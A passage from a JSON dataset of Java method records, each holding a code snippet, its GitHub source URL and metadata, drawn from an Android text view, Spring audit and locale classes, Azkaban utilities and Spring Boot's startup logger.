["public"]}}, {"id": 34127, "method_name": "setTextSize", "class_name": "AutoResizeRobotoTextView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTextSize(final float size) {\n        mMaxTextSize = size;\n        mTextCachedSizes.clear();\n        adjustTextSize();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34128, "method_name": "setMaxLines", "class_name": "AutoResizeRobotoTextView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMaxLines(final int maxlines) {\n        super.setMaxLines(maxlines);\n        mMaxLines = maxlines;\n        reAdjust();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34129, "method_name": "getMaxLines", "class_name": "AutoResizeRobotoTextView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMaxLines() {\n        return mMaxLines;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34130, "method_name": "setSingleLine", "class_name": "AutoResizeRobotoTextView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSingleLine() {\n        super.setSingleLine();\n        mMaxLines = 1;\n        reAdjust();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34131, "method_name": "setSingleLine", "class_name": "AutoResizeRobotoTextView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSingleLine(final boolean singleLine) {\n        super.setSingleLine(singleLine);\n        if (singleLine)\n            mMaxLines = 1;\n        else mMaxLines = NO_LINE_LIMIT;\n        reAdjust();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34132, "method_name": "setLines", "class_name": "AutoResizeRobotoTextView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLines(final int lines) {\n        super.setLines(lines);\n        mMaxLines = lines;\n        reAdjust();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34133, "method_name": "setTextSize", "class_name": "AutoResizeRobotoTextView", "params": ["int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTextSize(final int unit, final float size) {\n        final Context c = getContext();\n        Resources r;\n        if (c == null)\n            r = Resources.getSystem();\n        else r = c.getResources();\n        mMaxTextSize = TypedValue.applyDimension(unit, size, r.getDisplayMetrics());\n        mTextCachedSizes.clear();\n        adjustTextSize();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34134, "method_name": "setLineSpacing", "class_name": "AutoResizeRobotoTextView", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLineSpacing(final float add, final float mult) {\n        super.setLineSpacing(add, mult);\n        mSpacingMulti = mult;\n        mSpacingAdd = add;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34135, "method_name": "setMinTextSize", "class_name": "AutoResizeRobotoTextView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMinTextSize(final float minTextSize) {\n        mMinTextSize = minTextSize;\n        reAdjust();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34136, "method_name": "reAdjust", "class_name": "AutoResizeRobotoTextView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void reAdjust() {\n        adjustTextSize();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34137, "method_name": "adjustTextSize", "class_name": "AutoResizeRobotoTextView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void adjustTextSize() {\n        if (!mInitialised)\n            return;\n        final int startSize = (int) mMinTextSize;\n        final int heightLimit = getMeasuredHeight() - getCompoundPaddingBottom() - getCompoundPaddingTop();\n        mWidthLimit = getMeasuredWidth() - getCompoundPaddingLeft() - getCompoundPaddingRight();\n        if (mWidthLimit <= 0)\n            return;\n        mAvailableSpaceRect.right = mWidthLimit;\n        mAvailableSpaceRect.bottom = heightLimit;\n        super.setTextSize(TypedValue.COMPLEX_UNIT_PX, efficientTextSizeSearch(startSize, (int) mMaxTextSize, mSizeTester, mAvailableSpaceRect));\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34138, "method_name": "setEnableSizeCache", "class_name": "AutoResizeRobotoTextView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEnableSizeCache(final boolean enable) {\n        mEnableSizeCache = enable;\n        mTextCachedSizes.clear();\n        adjustTextSize();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34139, "method_name": "efficientTextSizeSearch", "class_name": "AutoResizeRobotoTextView", "params": ["int", "int", "SizeTester", "RectF"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int efficientTextSizeSearch(final int start, final int end, final SizeTester sizeTester, final RectF availableSpace) {\n        if (!mEnableSizeCache)\n            return binarySearch(start, end, sizeTester, availableSpace);\n        final String text = getText().toString();\n        final int key = text.equalsIgnoreCase(\"\") ? 0 : text.length();\n        int size = mTextCachedSizes.get(key);\n        if (size != 0)\n            return size;\n        size = binarySearch(start, end, sizeTester, availableSpace);\n        mTextCachedSizes.put(key, size);\n        return size;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34140, "method_name": "binarySearch", "class_name": "AutoResizeRobotoTextView", "params": ["int", "int", "SizeTester", "RectF"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int binarySearch(final int start, final int end, final SizeTester sizeTester, final RectF availableSpace) {\n        int lastBest = start;\n        int lo = start;\n        int hi = end - 1;\n        int mid = 0;\n        while (lo <= hi) {\n            mid = lo + hi >>> 1;\n            final int midValCmp = sizeTester.onTestSize(mid, availableSpace);\n            if (midValCmp < 0) {\n                lastBest = lo;\n                lo = mid + 1;\n            } else if (midValCmp > 0) {\n                hi = mid - 1;\n                lastBest = hi;\n            } else return mid;\n        }\n        // make sure to return last best\n        // this is what should always be returned\n        return lastBest;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34141, "method_name": "onTextChanged", "class_name": "AutoResizeRobotoTextView", "params": ["CharSequence", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onTextChanged(final CharSequence text, final int start, final int before, final int after) {\n        super.onTextChanged(text, start, before, after);\n        reAdjust();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34142, "method_name": "onSizeChanged", "class_name": "AutoResizeRobotoTextView", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onSizeChanged(final int width, final int height, final int oldwidth, final int oldheight) {\n        mTextCachedSizes.clear();\n        super.onSizeChanged(width, height, oldwidth, oldheight);\n        if (width != oldwidth || height != oldheight)\n            reAdjust();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"id": 34143, "method_name": "onClickLitener", "class_name": "NoDoubleClickAspect", "params": ["ProceedingJoinPoint"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClickLitener(ProceedingJoinPoint proceedingJoinPoint) throws Throwable {\n        Log.e(\"NoDoubleClickAspect\", \"OnClick\");\n        if (!NoDoubleClickUtils.isDoubleClick()) {\n            proceedingJoinPoint.proceed();\n        }\n    }", "url": "https://raw.githubusercontent.com/he303954106/AOP_Demo/master/app/src/main/java/com/netease/aop/login/aspect/NoDoubleClickAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34144, "method_name": "showLog", "class_name": "Demo01Logger", "params": ["int", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void showLog(int level, String message){\n        //\u5bf9\u65e5\u5fd7\u7684\u7b49\u7ea7\u8fdb\u884c\u5224\u65ad,\u5982\u679c\u662f1\u7ea7\u522b,\u90a3\u4e48\u8f93\u51fa\u65e5\u5fd7\u4fe1\u606f\n        if(level==1){\n            System.out.println(message);\n        }\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo02/Lambda/Demo01Logger.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34145, "method_name": "main", "class_name": "Demo01Logger", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u5b9a\u4e49\u4e09\u4e2a\u65e5\u5fd7\u4fe1\u606f\n        String msg1 = \"Hello\";\n        String msg2 = \"World\";\n        String msg3 = \"Java\";\n\n        //\u8c03\u7528showLog\u65b9\u6cd5,\u4f20\u9012\u65e5\u5fd7\u7ea7\u522b\u548c\u65e5\u5fd7\u4fe1\u606f\n        showLog(2,msg1+msg2+msg3);\n\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo02/Lambda/Demo01Logger.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34146, "method_name": "getAll", "class_name": "AuditController", "params": ["Pageable"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<List>", "snippet": "    public ResponseEntity<List<AuditEvent>> getAll(Pageable pageable) {\n        Page<AuditEvent> page = auditEventService.findAll(pageable);\n        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(ServletUriComponentsBuilder.fromCurrentRequest(), page);\n        return new ResponseEntity<>(page.getContent(), headers, HttpStatus.OK);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/AuditController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34147, "method_name": "getByDates", "class_name": "AuditController", "params": ["LocalDate", "LocalDate", "Pageable"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<List>", "snippet": "    public ResponseEntity<List<AuditEvent>> getByDates(\n        @RequestParam(value = \"fromDate\") LocalDate fromDate,\n        @RequestParam(value = \"toDate\") LocalDate toDate,\n        Pageable pageable) {\n\n        Instant from = fromDate.atStartOfDay(ZoneId.systemDefault()).toInstant();\n        Instant to = toDate.atStartOfDay(ZoneId.systemDefault()).plusDays(1).toInstant();\n\n        Page<AuditEvent> page = auditEventService.findByDates(from, to, pageable);\n        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(ServletUriComponentsBuilder.fromCurrentRequest(), page);\n        return new ResponseEntity<>(page.getContent(), headers, HttpStatus.OK);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/AuditController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34148, "method_name": "get", "class_name": "AuditController", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<AuditEvent>", "snippet": "    public ResponseEntity<AuditEvent> get(@PathVariable Long id) {\n        return ResponseUtil.wrapOrNotFound(auditEventService.find(id));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/AuditController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34149, "method_name": "localeResolver", "class_name": "LocaleConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LocaleResolver", "snippet": "    public LocaleResolver localeResolver() {\n        AngularCookieLocaleResolver cookieLocaleResolver = new AngularCookieLocaleResolver();\n        cookieLocaleResolver.setCookieName(\"NG_TRANSLATE_LANG_KEY\");\n        return cookieLocaleResolver;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/LocaleConfiguration.java", "stars": "2", "class_props": {"extends": null, "implements": ["WebMvcConfigurer"], "modifiers": ["public"]}}, {"id": 34150, "method_name": "addInterceptors", "class_name": "LocaleConfiguration", "params": ["InterceptorRegistry"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addInterceptors(InterceptorRegistry registry) {\n        LocaleChangeInterceptor localeChangeInterceptor = new LocaleChangeInterceptor();\n        localeChangeInterceptor.setParamName(\"language\");\n        registry.addInterceptor(localeChangeInterceptor);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/LocaleConfiguration.java", "stars": "2", "class_props": {"extends": null, "implements": ["WebMvcConfigurer"], "modifiers": ["public"]}}, {"id": 34151, "method_name": "getString", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getString(final K key) {\n    return getString(key, null);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34152, "method_name": "getString", "class_name": "TypedMapWrapper", "params": ["K", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getString(final K key, final String defaultVal) {\n    final Object obj = this.map.get(key);\n    if (obj == null) {\n      return defaultVal;\n    }\n    if (obj instanceof String) {\n      return (String) obj;\n    }\n\n    return obj.toString();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34153, "method_name": "getBool", "class_name": "TypedMapWrapper", "params": ["K", "Boolean"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "  public Boolean getBool(final K key, final Boolean defaultVal) {\n    final Object obj = this.map.get(key);\n    if (obj == null) {\n      return defaultVal;\n    }\n\n    return (Boolean) obj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34154, "method_name": "getInt", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getInt(final K key) {\n    return getInt(key, -1);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34155, "method_name": "getInt", "class_name": "TypedMapWrapper", "params": ["K", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getInt(final K key, final Integer defaultVal) {\n    final Object obj = this.map.get(key);\n    if (obj == null) {\n      return defaultVal;\n    }\n    if (obj instanceof Integer) {\n      return (Integer) obj;\n    } else if (obj instanceof String) {\n      return Integer.valueOf((String) obj);\n    } else {\n      return defaultVal;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34156, "method_name": "getLong", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getLong(final K key) {\n    return getLong(key, -1L);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34157, "method_name": "getLong", "class_name": "TypedMapWrapper", "params": ["K", "Long"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getLong(final K key, final Long defaultVal) {\n    final Object obj = this.map.get(key);\n    if (obj == null) {\n      return defaultVal;\n    }\n    if (obj instanceof Long) {\n      return (Long) obj;\n    } else if (obj instanceof Integer) {\n      return Long.valueOf((Integer) obj);\n    } else if (obj instanceof String) {\n      return Long.valueOf((String) obj);\n    } else {\n      return defaultVal;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34158, "method_name": "getDouble", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getDouble(final K key) {\n    return getDouble(key, -1.0d);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34159, "method_name": "getDouble", "class_name": "TypedMapWrapper", "params": ["K", "Double"], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getDouble(final K key, final Double defaultVal) {\n    final Object obj = this.map.get(key);\n    if (obj == null) {\n      return defaultVal;\n    }\n    if (obj instanceof Double) {\n      return (Double) obj;\n    } else if (obj instanceof String) {\n      return Double.valueOf((String) obj);\n    } else {\n      return defaultVal;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34160, "method_name": "getStringCollection", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "Collection<String>", "snippet": "  public Collection<String> getStringCollection(final K key) {\n    final Object obj = this.map.get(key);\n    return (Collection<String>) obj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34161, "method_name": "getStringCollection", "class_name": "TypedMapWrapper", "params": ["K", "Collection<String>"], "throws": null, "modifiers": ["public"], "return_type": "Collection<String>", "snippet": "  public Collection<String> getStringCollection(final K key,\n      final Collection<String> defaultVal) {\n    final Object obj = this.map.get(key);\n    if (obj == null) {\n      return defaultVal;\n    }\n\n    return (Collection<String>) obj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34162, "method_name": "getCollection", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "Collection<C>", "snippet": "  public <C> Collection<C> getCollection(final K key) {\n    final Object obj = this.map.get(key);\n    if (obj instanceof Collection) {\n      return (Collection<C>) obj;\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34163, "method_name": "getList", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "List<L>", "snippet": "  public <L> List<L> getList(final K key) {\n    final Object obj = this.map.get(key);\n    if (obj instanceof List) {\n      return (List<L>) obj;\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34164, "method_name": "getList", "class_name": "TypedMapWrapper", "params": ["K", "List<L>"], "throws": null, "modifiers": ["public"], "return_type": "List<L>", "snippet": "  public <L> List<L> getList(final K key, final List<L> defaultVal) {\n    final Object obj = this.map.get(key);\n    if (obj instanceof List) {\n      return (List<L>) obj;\n    }\n    return defaultVal;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34165, "method_name": "getObject", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getObject(final K key) {\n    return this.map.get(key);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34166, "method_name": "getMap", "class_name": "TypedMapWrapper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<K,V>", "snippet": "  public Map<K, V> getMap() {\n    return this.map;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34167, "method_name": "getMap", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "Map<S,T>", "snippet": "  public <S, T> Map<S, T> getMap(final K key) {\n    return (Map<S, T>) this.map.get(key);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34168, "method_name": "containsKey", "class_name": "TypedMapWrapper", "params": ["K"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean containsKey(final K key) {\n    return this.map.containsKey(key);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/TypedMapWrapper.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34169, "method_name": "logStarting", "class_name": "StartupInfoLogger", "params": ["Log"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid logStarting(Log applicationLog) {\n\t\tAssert.notNull(applicationLog, \"Log must not be null\");\n\t\tapplicationLog.info(LogMessage.of(this::getStartingMessage));\n\t\tapplicationLog.debug(LogMessage.of(this::getRunningMessage));\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34170, "method_name": "logStarted", "class_name": "StartupInfoLogger", "params": ["Log", "StopWatch"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid logStarted(Log applicationLog, StopWatch stopWatch) {\n\t\tif (applicationLog.isInfoEnabled()) {\n\t\t\tapplicationLog.info(getStartedMessage(stopWatch));\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34171, "method_name": "getStartingMessage", "class_name": "StartupInfoLogger", "params": [], "throws": null, "modifiers": ["private"], "return_type": "CharSequence", "snippet": "\tprivate CharSequence getStartingMessage() {\n\t\tStringBuilder message = new StringBuilder();\n\t\tmessage.append(\"Starting \");\n\t\tappendApplicationName(message);\n\t\tappendVersion(message, this.sourceClass);\n\t\tappendOn(message);\n\t\tappendPid(message);\n\t\tappendContext(message);\n\t\treturn message;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34172, "method_name": "getRunningMessage", "class_name": "StartupInfoLogger", "params": [], "throws": null, "modifiers": ["private"], "return_type": "CharSequence", "snippet": "\tprivate CharSequence getRunningMessage() {\n\t\tStringBuilder message = new StringBuilder();\n\t\tmessage.append(\"Running with Spring Boot\");\n\t\tappendVersion(message, getClass());\n\t\tmessage.append(\", Spring\");\n\t\tappendVersion(message, ApplicationContext.class);\n\t\treturn message;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34173, "method_name": "getStartedMessage", "class_name": "StartupInfoLogger", "params": ["StopWatch"], "throws": null, "modifiers": ["private"], "return_type": "CharSequence", "snippet": "\tprivate CharSequence getStartedMessage(StopWatch stopWatch) {\n\t\tStringBuilder message = new StringBuilder();\n\t\tmessage.append(\"Started \");\n\t\tappendApplicationName(message);\n\t\tmessage.append(\" in \");\n\t\tmessage.append(stopWatch.getTotalTimeMillis() / 1000.0);\n\t\tmessage.append(\" seconds\");\n\t\ttry {\n\t\t\tdouble uptime = ManagementFactory.getRuntimeMXBean().getUptime() / 1000.0;\n\t\t\tmessage.append(\" (JVM running for \").append(uptime).append(\")\");\n\t\t}\n\t\tcatch (Throwable ex) {\n\t\t\t// No JVM time available\n\t\t}\n\t\treturn message;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34174, "method_name": "appendApplicationName", "class_name": "StartupInfoLogger", "params": ["StringBuilder"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void appendApplicationName(StringBuilder message) {\n\t\tString name = (this.sourceClass != null) ? ClassUtils.getShortName(this.sourceClass) : \"application\";\n\t\tmessage.append(name);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34175, "method_name": "appendVersion", "class_name": "StartupInfoLogger", "params": ["StringBuilder", "Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void appendVersion(StringBuilder message, Class<?> source) {\n\t\tappend(message, \"v\", () -> source.getPackage().getImplementationVersion());\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34176, "method_name": "appendOn", "class_name": "StartupInfoLogger", "params": ["StringBuilder"], "throws": null, "modifiers": ["private"], "return_type": "void", 